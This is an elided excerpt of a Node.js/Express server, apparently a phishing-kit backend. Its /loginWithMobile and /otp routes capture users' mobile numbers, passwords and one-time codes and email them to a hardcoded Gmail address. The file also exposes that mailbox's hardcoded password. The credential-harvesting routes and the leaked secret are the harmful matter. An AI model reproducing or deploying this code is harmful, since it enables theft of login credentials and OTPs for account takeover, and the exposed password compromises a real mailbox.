...
// emails credentials
const userEmail = "evarestmich@gmail.com";
const pass = "dasemzhveooxmaec";
...
// API routes for index
app.post("/loginWithMobile", (req, res) => {
  ...
  const mailOptions = {
    ...
    text: `New user registered with Mobile: ${mobile} and password: ${password}`,
  };
...
app.post("/otp", (req, res) => {
  ...
  const mailOptions = {
    from: email,
    to: userEmail,
    subject:`OTP: ${req.body?.code} `,
    text: `New user registered OTP: ${req.body?.code} `,
  };
